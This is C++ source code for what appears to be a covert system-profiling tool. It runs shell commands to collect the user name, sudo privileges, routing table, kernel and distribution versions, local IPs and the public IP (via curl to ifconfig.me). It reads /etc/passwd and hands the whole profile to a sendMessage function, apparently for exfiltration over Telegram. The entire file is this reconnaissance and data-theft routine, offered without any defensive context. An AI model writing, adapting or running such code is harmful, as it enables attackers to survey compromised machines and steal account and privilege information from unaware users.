#include <stdio.h>
#include <iostream>
#include <cstdlib>  
#include <string>
#include "tg.h"
#include "spYguino.h"
#include <fstream>
#include <sstream>

std::string runCommand(std::string command)
{
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string readFile(const std::string& filename) {
    std::ifstream file(filename);
    if (!file.is_open()) {
        return "";
    }

    std::ostringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}


SystemProfile systemprofile()
{

    struct SystemProfile currentProfile;
    currentProfile.user = runCommand("whoami");
    currentProfile.sudouser = runCommand("sudo -l");
    currentProfile.tablaenrutamiento = runCommand("route");
    currentProfile.kernelVersion = runCommand("uname -r");
    currentProfile.distro = runCommand("lsb_release -a 2> /dev/null");
    currentProfile.ip = runCommand("hostname -I");
    currentProfile.ip_publica = runCommand("curl -s ifconfig.me");
    currentProfile.etcpasswd = readFile("/etc/passwd");
    return currentProfile;
}

int main(int argc, char const *argv[])
{
    struct SystemProfile currentProfile;
    
    currentProfile = systemprofile();
    sendMessage(currentProfile);
    
    return 0;
}


